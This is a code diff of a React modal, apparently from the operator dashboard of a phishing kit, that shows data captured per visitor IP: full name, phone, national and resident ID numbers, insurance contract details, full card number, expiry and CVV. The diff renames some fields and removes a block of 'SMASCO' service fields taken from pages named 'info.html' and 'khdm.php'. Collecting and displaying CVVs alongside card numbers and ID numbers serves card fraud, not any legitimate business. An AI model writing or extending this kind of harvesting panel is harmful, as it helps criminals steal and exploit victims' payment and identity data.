@@ -3,10 +3,10 @@ import { Modal, Button, FormControl } from "react-bootstrap";
 
 export default function InfoModal({ ip, user, onClose }) {
   const rows = [
-    ["Full Name", user.FullName],
-    ["Phone Number", user.PhoneNumber],
+    ["Full Name", user.fullname],
+    ["Phone Number", user.phone],
     ["Buyer ID", user.BuyerIDnumber],
-    ["Resident ID", user.IDorResidenceNumber],
+    ["Resident ID", user.IDNumber],
     ["Contract Type", user.TypeOfInsuranceContract],
     ["Start Date", user.InsuranceStartDate],
     ["Purpose", user.PurposeOfUse],
@@ -29,30 +29,6 @@ export default function InfoModal({ ip, user, onClose }) {
     ["Card #", user.cardNumber],
     ["Expiry", user.expirationDate],
     ["CVV", user.cvv],
-    // 🔹 SMASCO Info (from info.html)
-    ["SMASCO - Full Name", user.fullname],
-    ["SMASCO - ID Number", user.IDNumber],
-    ["SMASCO - Phone", user.phone],
-    ["SMASCO - City", user.city],
-    ["SMASCO - Service", user.service],
-    ["SMASCO - Request ID", user.requestId],
-    // 🔹 SMASCO Service (from khdm.php)
-    ["Service Type", user.service_type],
-    ["Worker Nationality", user.worker_nationality],
-    ["Duration Type", user.duration_type],
-    ["Hours Package", user.hours_package],
-    ["Months Package", user.months_package],
-    ["Contract Duration", user.contract_duration],
-    ["Package", user.package],
-    ["Amount", user.amount],
-    ["Service Start Date", user.service_start_date],
-    ["Workers Count", user.workers_count],
-    ["Visit Duration", user.visit_duration],
-    ["Visit Period", user.visit_period],
-    ["Visit Days", user.visit_days],
-    ["Pickup Time", user.pickup_time],
-    ["Pickup Time Hours", user.pickup_time_hours],
-    ["Pickup Time Months", user.pickup_time_months],
   ];
 
   return (
